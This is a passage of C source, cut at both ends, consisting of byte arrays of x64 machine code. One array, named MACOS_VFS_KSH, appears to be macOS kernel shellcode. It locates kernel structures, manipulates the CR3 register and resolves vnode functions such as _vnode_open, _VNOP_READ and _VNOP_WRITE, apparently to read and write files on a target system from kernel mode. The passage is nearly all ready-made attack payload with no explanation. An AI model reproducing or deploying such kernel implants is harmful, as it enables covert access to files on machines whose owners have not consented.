  0x8b, 0x4b, 0x18, 0x45, 0x8d, 0x41, 0x42, 0xe8, 0xa8, 0xfb, 0xff, 0xff, 0x48, 0xb9, 0x00, 0x00,
  0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x48, 0x3b, 0xc1, 0x76, 0x07, 0xb8, 0x02, 0x00, 0x00, 0xf0,
  0xeb, 0x11, 0x48, 0x8b, 0x4b, 0x10, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0xd0, 0xe8, 0x83, 0xfb, 0xff,
  0xff, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83,
  0xec, 0x20, 0x48, 0x8b, 0x4a, 0x60, 0x48, 0x8b, 0xda, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x85,
  0xc9, 0x74, 0x0b, 0x49, 0x8d, 0x50, 0x18, 0xe8, 0x58, 0xfb, 0xff, 0xff, 0xeb, 0x3a, 0x48, 0x8b,
  0x4a, 0x70, 0x48, 0x85, 0xc9, 0x74, 0x07, 0x48, 0x83, 0x7a, 0x78, 0x00, 0x75, 0x10, 0x48, 0x8b,
  0x4a, 0x68, 0x48, 0x85, 0xc9, 0x74, 0x21, 0x48, 0x83, 0x7a, 0x78, 0x00, 0x74, 0x1a, 0x49, 0x8d,
  0x50, 0x18, 0xe8, 0x2d, 0xfb, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x78, 0x4c, 0x8b, 0xc0, 0xba, 0x9c,
  0xff, 0xff, 0xff, 0xe8, 0x1c, 0xfb, 0xff, 0xff, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0x25, 0x05, 0x00,
  0x00, 0xf0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c,
  0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xda, 0x49,
  0x8b, 0xe8, 0x48, 0x8b, 0xf9, 0x49, 0x8d, 0x50, 0x18, 0x45, 0x33, 0xc9, 0x41, 0xb8, 0x00, 0x00,
  0x05, 0x00, 0x48, 0x8b, 0x4b, 0x18, 0xe8, 0xd9, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0xb8,
  0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x48, 0x3b, 0xf0, 0x76, 0x0a, 0xb8, 0x02, 0x00,
  0x00, 0xf0, 0xe9, 0x84, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x92, 0x00, 0x00, 0x00, 0xe8, 0xed,
  0xfa, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x40, 0x4c, 0x8d, 0x05, 0xea, 0xfa, 0xff, 0xff, 0x4c, 0x89,
  0x44, 0x24, 0x20, 0x48, 0x89, 0x5c, 0x24, 0x38, 0x48, 0x89, 0x7c, 0x24, 0x30, 0x48, 0x89, 0x6c,
  0x24, 0x40, 0x48, 0x85, 0xc9, 0x74, 0x0f, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd6, 0xe8,
  0x80, 0xfa, 0xff, 0xff, 0xeb, 0x16, 0x48, 0x8b, 0x4b, 0x48, 0x48, 0x85, 0xc9, 0x74, 0x14, 0x4c,
  0x8d, 0x4c, 0x24, 0x20, 0x48, 0x8b, 0xd6, 0xe8, 0x68, 0xfa, 0xff, 0xff, 0x48, 0x89, 0x87, 0x28,
  0x02, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x10, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0xd6, 0xe8, 0x52, 0xfa,
  0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0xe8, 0x49, 0xfa, 0xff, 0xff, 0x4c, 0x8b, 0xc5, 0x48, 0x8b,
  0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0xf7, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x60,
  0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3,
  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
  0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0x49, 0x10, 0x48, 0x8b, 0xf9, 0x49, 0x63, 0xf0, 0x48, 0x8b,
  0xea, 0x49, 0x8b, 0x89, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x81, 0x40, 0x02, 0x00, 0x00, 0x49,
  0x3b, 0x81, 0x10, 0x02, 0x00, 0x00, 0x0f, 0x87, 0x8b, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x99, 0x08,
  0x02, 0x00, 0x00, 0x45, 0x33, 0xc0, 0x49, 0x03, 0x59, 0x28, 0x41, 0xb9, 0x40, 0x02, 0x00, 0x00,
  0x48, 0x03, 0xd9, 0x48, 0x8b, 0x4f, 0x18, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0x49, 0x08, 0xe8, 0xc1,
  0xf9, 0xff, 0xff, 0x8b, 0x4c, 0x24, 0x58, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x3b, 0xc8, 0x74, 0x1b,
  0x8d, 0x50, 0x04, 0x3b, 0xca, 0x74, 0x0b, 0x83, 0xf9, 0x0a, 0x0f, 0x45, 0xc2, 0x48, 0x89, 0x03,
  0xeb, 0x10, 0x48, 0xc7, 0x03, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x07, 0x48, 0xc7, 0x03, 0x02, 0x00,
  0x00, 0x00, 0x33, 0xc9, 0x85, 0xf6, 0x74, 0x20, 0x48, 0x83, 0xc3, 0x38, 0x48, 0x81, 0xf9, 0x03,
  0x01, 0x00, 0x00, 0x73, 0x13, 0x0f, 0xb6, 0x04, 0x29, 0x48, 0xff, 0xc1, 0x66, 0x89, 0x03, 0x48,
  0x83, 0xc3, 0x02, 0x48, 0x3b, 0xce, 0x72, 0xe4, 0x48, 0x8b, 0x47, 0x10, 0x48, 0x81, 0x80, 0x00,
  0x02, 0x00, 0x00, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x33, 0xc0, 0x48, 0x8b,
  0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55,
  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xa8, 0x78, 0xf5, 0xff, 0xff, 0x48,
  0x81, 0xec, 0x60, 0x0b, 0x00, 0x00, 0x45, 0x33, 0xe4, 0x48, 0xb8, 0x8f, 0xe3, 0x38, 0x8e, 0xe3,
  0x38, 0x8e, 0xe3, 0x48, 0x8b, 0xfa, 0x4c, 0x8b, 0xe9, 0x48, 0xf7, 0xa1, 0x00, 0x02, 0x00, 0x00,
  0x48, 0x8d, 0x45, 0x50, 0x41, 0x8b, 0xdc, 0x48, 0x8b, 0xf2, 0x48, 0xc1, 0xee, 0x09, 0x4c, 0x2b,
  0xc0, 0x49, 0x8d, 0x04, 0x18, 0x8a, 0x4c, 0x05, 0x68, 0x84, 0xc9, 0x74, 0x10, 0x88, 0x4c, 0x1d,
  0x50, 0x48, 0xff, 0xc3, 0x48, 0x81, 0xfb, 0x04, 0x01, 0x00, 0x00, 0x72, 0xe4, 0xc6, 0x44, 0x1d,
  0x50, 0x2f, 0x4d, 0x8b, 0xf4, 0x48, 0xff, 0xc3, 0x49, 0x89, 0xb5, 0x30, 0x02, 0x00, 0x00, 0x48,
  0x85, 0xf6, 0x0f, 0x84, 0x08, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0x50, 0x49, 0x8b, 0xcc, 0x4c,
  0x03, 0xc3, 0x48, 0x89, 0x8d, 0x90, 0x0a, 0x00, 0x00, 0x4d, 0x8b, 0xbd, 0x08, 0x02, 0x00, 0x00,
  0x4c, 0x03, 0xf9, 0x49, 0x8b, 0xcc, 0x4d, 0x03, 0x7d, 0x28, 0x49, 0x8d, 0x57, 0x38, 0x66, 0x44,
  0x3b, 0x22, 0x74, 0x16, 0x8a, 0x02, 0x48, 0x83, 0xc2, 0x02, 0x41, 0x88, 0x04, 0x08, 0x48, 0xff,
  0xc1, 0x48, 0x81, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x72, 0xe4, 0x48, 0x8d, 0x04, 0x19, 0x48, 0x8b,
  0x4f, 0x58, 0x44, 0x88, 0x64, 0x05, 0x50, 0x48, 0x85, 0xc9, 0x0f, 0x84, 0xef, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x45, 0xb0, 0xc7, 0x44, 0x24, 0x28, 0xff, 0x07, 0x00, 0x00, 0x41, 0xb9, 0x00, 0x08,
  0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x45, 0x50, 0xba, 0x9c, 0xff, 0xff, 0xff,
  0xe8, 0x3f, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x82, 0x00, 0x00, 0x00, 0x48, 0x8b,
  0x8f, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x0f, 0x84, 0x14, 0x01, 0x00, 0x00, 0x4c, 0x39,
  0xa7, 0x90, 0x00, 0x00, 0x00, 0x0f, 0x84, 0x07, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x8d, 0x60, 0x02,
  0x00, 0x00, 0x41, 0xb8, 0x00, 0x08, 0x00, 0x00, 0x48, 0x8d, 0x55, 0x50, 0xe8, 0x03, 0xf8, 0xff,
  0xff, 0x48, 0x85, 0xc0, 0x0f, 0x85, 0xe8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8f, 0x90, 0x00, 0x00,
  0x00, 0x4c, 0x8d, 0x45, 0xb0, 0x41, 0xb9, 0xff, 0x07, 0x00, 0x00, 0x4c, 0x89, 0x64, 0x24, 0x20,
  0x48, 0x8d, 0x95, 0x60, 0x02, 0x00, 0x00, 0xe8, 0xd8, 0xf7, 0xff, 0xff, 0x48, 0x8b, 0x8f, 0x88,
  0x00, 0x00, 0x00, 0x4c, 0x8b, 0xe0, 0x48, 0x85, 0xc9, 0x74, 0x0c, 0x48, 0x8d, 0x95, 0x60, 0x02,
  0x00, 0x00, 0xe8, 0xbd, 0xf7, 0xff, 0xff, 0x4d, 0x85, 0xe4, 0x0f, 0x85, 0xa2, 0x00, 0x00, 0x00,
  0x48, 0x8b, 0x45, 0xe8, 0x49, 0xb8, 0x00, 0x91, 0x10, 0xb6, 0x02, 0x00, 0x00, 0x00, 0x49, 0x89,
  0x47, 0x30, 0x48, 0x8b, 0x4d, 0xf0, 0x49, 0x03, 0xc8, 0x48, 0x69, 0xc1, 0x80, 0x96, 0x98, 0x00,
  0x49, 0x89, 0x47, 0x08, 0x48, 0x8b, 0x4d, 0x10, 0x49, 0x03, 0xc8, 0x48, 0x69, 0xc1, 0x80, 0x96,
  0x98, 0x00, 0x49, 0x89, 0x47, 0x18, 0x48, 0x8b, 0x4d, 0x00, 0x49, 0x03, 0xc8, 0xeb, 0x58, 0x48,
  0x8b, 0x4f, 0x50, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x55, 0x50, 0xe8, 0x63, 0xf7, 0xff,
  0xff, 0x48, 0x85, 0xc0, 0x75, 0x4c, 0x48, 0x8b, 0x44, 0x24, 0x50, 0x48, 0xba, 0x00, 0x91, 0x10,
  0xb6, 0x02, 0x00, 0x00, 0x00, 0x49, 0x89, 0x47, 0x30, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0x48, 0x03,
  0xca, 0x48, 0x69, 0xc1, 0x80, 0x96, 0x98, 0x00, 0x49, 0x89, 0x47, 0x08, 0x48, 0x8b, 0x4c, 0x24,
  0x78, 0x48, 0x03, 0xca, 0x48, 0x69, 0xc1, 0x80, 0x96, 0x98, 0x00, 0x49, 0x89, 0x47, 0x18, 0x48,
  0x8b, 0x4c, 0x24, 0x68, 0x48, 0x03, 0xca, 0x48, 0x69, 0xc1, 0x80, 0x96, 0x98, 0x00, 0x49, 0x89,
  0x47, 0x10, 0x48, 0xb8, 0x15, 0xae, 0x47, 0xe1, 0x7a, 0x14, 0xae, 0x47, 0x49, 0xf7, 0xe6, 0x49,
  0x8b, 0xc6, 0x48, 0x2b, 0xc2, 0x48, 0xd1, 0xe8, 0x48, 0x03, 0xc2, 0x48, 0xc1, 0xe8, 0x05, 0x48,
  0x6b, 0xc8, 0x32, 0x4c, 0x3b, 0xf1, 0x75, 0x09, 0x48, 0x8b, 0x4f, 0x30, 0xe8, 0xe3, 0xf6, 0xff,
  0xff, 0x48, 0x8b, 0x8d, 0x90, 0x0a, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0x50, 0x48, 0x81, 0xc1, 0x40,
  0x02, 0x00, 0x00, 0x4d, 0x8d, 0x04, 0x18, 0x49, 0xff, 0xc6, 0x48, 0x89, 0x8d, 0x90, 0x0a, 0x00,
  0x00, 0x41, 0xbc, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x3b, 0xf6, 0x0f, 0x82, 0x09, 0xfe, 0xff, 0xff,
  0x4c, 0x8d, 0x9c, 0x24, 0x60, 0x0b, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x73, 0x40,
  0x49, 0x8b, 0x7b, 0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d,
  0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89,
  0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xda, 0x49, 0x8b, 0xe8, 0x48, 0x8b,
  0xf9, 0x49, 0x8d, 0x50, 0x18, 0x45, 0x33, 0xc9, 0x41, 0xb8, 0x00, 0x00, 0x04, 0x00, 0x48, 0x8b,
  0x4b, 0x18, 0xe8, 0x5d, 0xf6, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0x48, 0x3b, 0xf0, 0x76, 0x07, 0xb8, 0x02, 0x00, 0x00, 0xf0, 0xeb, 0x61,
  0x48, 0x8b, 0x8b, 0x98, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x75, 0x04, 0x48, 0x8b, 0x4b, 0x20,
  0x4c, 0x8b, 0x87, 0x08, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x85, 0x28, 0x03, 0x00, 0x00, 0x4c, 0x03,
  0x47, 0x28, 0x48, 0x8b, 0xd6, 0x4c, 0x8b, 0x8f, 0x10, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
  0x20, 0xe8, 0x0e, 0xf6, 0xff, 0xff, 0x48, 0x89, 0x87, 0x00, 0x02, 0x00, 0x00, 0x45, 0x33, 0xc0,
  0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0xd6, 0xe8, 0xf8, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x87, 0x00,
  0x02, 0x00, 0x00, 0x48, 0x39, 0x87, 0x10, 0x02, 0x00, 0x00, 0x1b, 0xc0, 0x25, 0x05, 0x00, 0x00,
  0xf0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50,
  0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
  0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x30, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xfa, 0x4d, 0x8b, 0x40,
  0x10, 0x45, 0x33, 0xc9, 0x49, 0xc1, 0xe0, 0x03, 0x41, 0x81, 0xe0, 0x00, 0x06, 0x00, 0x00, 0x48,
  0x8b, 0x4f, 0x18, 0x48, 0x8d, 0x53, 0x18, 0x49, 0x81, 0xc8, 0x01, 0x00, 0x04, 0x00, 0xe8, 0x91,
  0xf5, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
  0x48, 0x3b, 0xf0, 0x76, 0x07, 0xb8, 0x02, 0x00, 0x00, 0xf0, 0xeb, 0x4e, 0x48, 0x8b, 0x8f, 0xa0,
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x75, 0x04, 0x48, 0x8b, 0x4f, 0x28, 0x4c, 0x8b, 0x8b, 0x30,
  0x03, 0x00, 0x00, 0x48, 0x8d, 0x83, 0x28, 0x03, 0x00, 0x00, 0x4c, 0x8d, 0x83, 0x38, 0x03, 0x00,
  0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd6, 0xe8, 0x46, 0xf5, 0xff, 0xff, 0x48, 0x8b,
  0x4f, 0x10, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xd8, 0xe8, 0x34, 0xf5, 0xff, 0xff,
  0x48, 0xf7, 0xdb, 0x1b, 0xc0, 0x25, 0x05, 0x00, 0x00, 0xf0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48,
  0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x81,
  0xec, 0xd0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x9e, 0xf5,
  0xff, 0xff, 0x85, 0xc0, 0x75, 0x0a, 0xb8, 0x01, 0x00, 0x00, 0xf0, 0xe9, 0xa6, 0x00, 0x00, 0x00,
  0x4c, 0x8b, 0x83, 0x08, 0x01, 0x00, 0x00, 0x4c, 0x03, 0x43, 0x28, 0x48, 0x81, 0xbb, 0x00, 0x01,
  0x00, 0x00, 0x38, 0x03, 0x00, 0x00, 0x0f, 0x82, 0x85, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x0f, 0x13,
  0xaa, 0x93, 0xad, 0x20, 0xe7, 0x79, 0x49, 0x39, 0x00, 0x75, 0x76, 0x41, 0xf6, 0x40, 0x10, 0x10,
  0x75, 0x6f, 0x49, 0x8b, 0x40, 0x08, 0x48, 0x83, 0xf8, 0x01, 0x75, 0x11, 0x48, 0x8d, 0x54, 0x24,
  0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x9f, 0xf9, 0xff, 0xff, 0x8b, 0xc0, 0xeb, 0x59, 0x48, 0x83, 0xf8,
  0x03, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x04, 0xfe, 0xff, 0xff,
  0xeb, 0xe7, 0x48, 0x83, 0xf8, 0x02, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb,
  0xe8, 0xb3, 0xfe, 0xff, 0xff, 0xeb, 0xd2, 0x48, 0x83, 0xf8, 0x04, 0x75, 0x0f, 0x48, 0x8d, 0x54,
  0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xa2, 0xf8, 0xff, 0xff, 0xeb, 0xbd, 0x48, 0x83, 0xf8, 0x05,
  0x75, 0x1b, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xdd, 0xf8, 0xff, 0xff, 0xeb,
  0xa8, 0xb8, 0x06, 0x00, 0x00, 0xf0, 0x48, 0x89, 0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0x81, 0xc4,
  0xd0, 0x00, 0x00, 0x00, 0x5b, 0xc3, 0x00
};

const BYTE MACOS_VFS_KSH[] = {
    0x37, 0x13, 0xec, 0x3c, 0x8c, 0x39, 0xe7, 0xd9, 0xaf, 0x57, 0xfa, 0x27,
    0x6e, 0x3f, 0xf6, 0xaa, 0xa6, 0xf4, 0x8b, 0x31, 0x8c, 0x78, 0x3c, 0x71,
    0x72, 0x40, 0x33, 0xa0, 0x9b, 0x91, 0xa1, 0x1c, 0x52, 0xb2, 0xd8, 0x5b,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1a, 0x0c, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xb5, 0x1b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0,
    0x48, 0x83, 0xec, 0x20, 0xe8, 0xd7, 0x0a, 0x00, 0x00, 0x48, 0x8b, 0xe6,
    0x5e, 0xc3, 0x51, 0x48, 0x33, 0xc9, 0x48, 0xff, 0xc9, 0x48, 0xff, 0xc1,
    0x8a, 0x04, 0x39, 0x3a, 0x04, 0x31, 0x75, 0x09, 0x3c, 0x00, 0x75, 0xf1,
    0x48, 0x33, 0xc0, 0x59, 0xc3, 0xb0, 0x01, 0x59, 0xc3, 0xb8, 0xcf, 0xfa,
    0xed, 0xfe, 0x3b, 0x07, 0x75, 0x37, 0xb8, 0x07, 0x00, 0x00, 0x01, 0x3b,
    0x47, 0x04, 0x75, 0x2d, 0x48, 0x33, 0xc9, 0x48, 0xb8, 0x5f, 0x5f, 0x4c,
    0x49, 0x4e, 0x4b, 0x45, 0x44, 0x48, 0x3b, 0x04, 0x39, 0x74, 0x0f, 0x48,
    0x83, 0xc1, 0x04, 0x48, 0x81, 0xf9, 0x00, 0x20, 0x00, 0x00, 0x74, 0x0d,
    0xeb, 0xeb, 0x48, 0x8b, 0x44, 0x39, 0x10, 0x48, 0x03, 0x44, 0x39, 0x18,
    0xc3, 0x48, 0x33, 0xc0, 0xc3, 0x48, 0x8b, 0xcf, 0x48, 0x83, 0xc1, 0x20,
    0xb8, 0x02, 0x00, 0x00, 0x00, 0x39, 0x01, 0x74, 0x08, 0x8b, 0x41, 0x04,
    0x48, 0x03, 0xc8, 0xeb, 0xef, 0x48, 0x8b, 0xc1, 0xc3, 0x41, 0x52, 0x57,
    0x56, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xf2, 0xe8, 0xd5, 0xff, 0xff, 0xff,
    0x4c, 0x8b, 0xc0, 0xe8, 0x89, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0xc8, 0x41,
    0x8b, 0x40, 0x14, 0x4c, 0x2b, 0xc8, 0x4d, 0x8b, 0xd1, 0x41, 0x8b, 0x48,
    0x0c, 0x49, 0x83, 0xe9, 0x10, 0x49, 0x8b, 0x41, 0x08, 0x48, 0xc1, 0xe8,
    0x20, 0x83, 0xf8, 0x80, 0x75, 0x11, 0x41, 0x8b, 0x39, 0x49, 0x03, 0xfa,
    0xe8, 0x3d, 0xff, 0xff, 0xff, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x0a, 0xe2,
    0xdc, 0x48, 0x33, 0xc0, 0x5e, 0x5f, 0x41, 0x5a, 0xc3, 0x49, 0x8b, 0x41,
    0x08, 0x5e, 0x5f, 0x41, 0x5a, 0xc3, 0x0f, 0x20, 0xd8, 0x0f, 0x22, 0xd8,
    0xc3, 0x0f, 0x20, 0xd8, 0xc3, 0x48, 0x8b, 0xc1, 0x57, 0x56, 0x41, 0x56,
    0x41, 0x57, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xf0, 0x49, 0x8b, 0xd1, 0x48,
    0x8b, 0x4c, 0x24, 0x48, 0x4c, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8b, 0x4c,
    0x24, 0x58, 0x4c, 0x8b, 0xfc, 0x4c, 0x8b, 0xb4, 0x24, 0x88, 0x00, 0x00,
    0x00, 0x41, 0x56, 0x4c, 0x8b, 0xb4, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41,
    0x56, 0x4c, 0x8b, 0xb4, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0x56, 0x4c,
    0x8b, 0xb4, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0x56, 0x4c, 0x8b, 0xb4,
    0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0x56, 0x4c, 0x8b, 0xb4, 0x24, 0x88,
    0x00, 0x00, 0x00, 0x41, 0x56, 0xff, 0xd0, 0x49, 0x8b, 0xe7, 0x41, 0x5f,
    0x41, 0x5e, 0x5e, 0x5f, 0xc3, 0x0f, 0x09, 0xc3, 0x48, 0x89, 0x5c, 0x24,
    0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55,
    0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24, 0x90, 0x48, 0x81, 0xec,
    0x70, 0x01, 0x00, 0x00, 0x45, 0x33, 0xff, 0xc7, 0x45, 0xb0, 0x5f, 0x76,
    0x6e, 0x6f, 0x48, 0x8d, 0x45, 0xb0, 0xc7, 0x45, 0xb4, 0x64, 0x65, 0x5f,
    0x6c, 0x48, 0x89, 0x45, 0x00, 0x48, 0x8b, 0xda, 0x48, 0x8d, 0x44, 0x24,
    0x30, 0xc7, 0x45, 0xb8, 0x6f, 0x6f, 0x6b, 0x75, 0x48, 0x89, 0x45, 0x08,
    0x4c, 0x8b, 0xf1, 0x48, 0x8d, 0x45, 0xc0, 0x66, 0xc7, 0x45, 0xbc, 0x70,
    0x00, 0x48, 0x89, 0x45, 0x10, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x48, 0x89,
    0x45, 0x18, 0x48, 0x8d, 0x45, 0xa0, 0x48, 0x89, 0x45, 0x20, 0x48, 0x8d,
    0x44, 0x24, 0x40, 0x48, 0x89, 0x45, 0x28, 0x48, 0x8d, 0x44, 0x24, 0x70,
    0x48, 0x89, 0x45, 0x30, 0x48, 0x8d, 0x45, 0xe8, 0x48, 0x89, 0x45, 0x38,
    0x48, 0x8d, 0x45, 0x80, 0x48, 0x89, 0x45, 0x40, 0x48, 0x8d, 0x44, 0x24,
    0x50, 0x48, 0x89, 0x45, 0x48, 0x48, 0x8d, 0x45, 0xd0, 0x48, 0x89, 0x45,
    0x50, 0x48, 0x8d, 0x45, 0x90, 0x48, 0x89, 0x45, 0x58, 0x48, 0x8d, 0x44,
    0x24, 0x20, 0x48, 0x89, 0x45, 0x60, 0xc7, 0x44, 0x24, 0x30, 0x5f, 0x76,
    0x6e, 0x6f, 0xc7, 0x44, 0x24, 0x34, 0x64, 0x65, 0x5f, 0x70, 0x66, 0xc7,
    0x44, 0x24, 0x38, 0x75, 0x74, 0x44, 0x88, 0x7c, 0x24, 0x3a, 0xc7, 0x45,
    0xc0, 0x5f, 0x76, 0x6e, 0x6f, 0xc7, 0x45, 0xc4, 0x64, 0x65, 0x5f, 0x73,
    0xc7, 0x45, 0xc8, 0x65, 0x74, 0x73, 0x69, 0x66, 0xc7, 0x45, 0xcc, 0x7a,
    0x65, 0x44, 0x88, 0x7d, 0xce, 0xc7, 0x44, 0x24, 0x60, 0x5f, 0x76, 0x6e,
    0x6f, 0xc7, 0x44, 0x24, 0x64, 0x64, 0x65, 0x5f, 0x6f, 0xc7, 0x44, 0x24,
    0x68, 0x70, 0x65, 0x6e, 0x00, 0xc7, 0x45, 0xa0, 0x5f, 0x76, 0x6e, 0x6f,
    0xc7, 0x45, 0xa4, 0x64, 0x65, 0x5f, 0x63, 0xc7, 0x45, 0xa8, 0x6c, 0x6f,
    0x73, 0x65, 0x44, 0x88, 0x7d, 0xac, 0xc7, 0x44, 0x24, 0x40, 0x5f, 0x56,
    0x4e, 0x4f, 0xc7, 0x44, 0x24, 0x44, 0x50, 0x5f, 0x52, 0x45, 0x66, 0xc7,
    0x44, 0x24, 0x48, 0x41, 0x44, 0x44, 0x88, 0x7c, 0x24, 0x4a, 0xc7, 0x44,
    0x24, 0x70, 0x5f, 0x56, 0x4e, 0x4f, 0xc7, 0x44, 0x24, 0x74, 0x50, 0x5f,
    0x57, 0x52, 0xc7, 0x44, 0x24, 0x78, 0x49, 0x54, 0x45, 0x00, 0xc7, 0x45,
    0xe8, 0x5f, 0x56, 0x4e, 0x4f, 0xc7, 0x45, 0xec, 0x50, 0x5f, 0x47, 0x45,
    0xc7, 0x45, 0xf0, 0x54, 0x41, 0x54, 0x54, 0xc7, 0x45, 0xf4, 0x52, 0x4c,
    0x49, 0x53, 0xc7, 0x45, 0xf8, 0x54, 0x42, 0x55, 0x4c, 0x66, 0xc7, 0x45,
    0xfc, 0x4b, 0x00, 0xc7, 0x45, 0x80, 0x5f, 0x75, 0x69, 0x6f, 0xc7, 0x45,
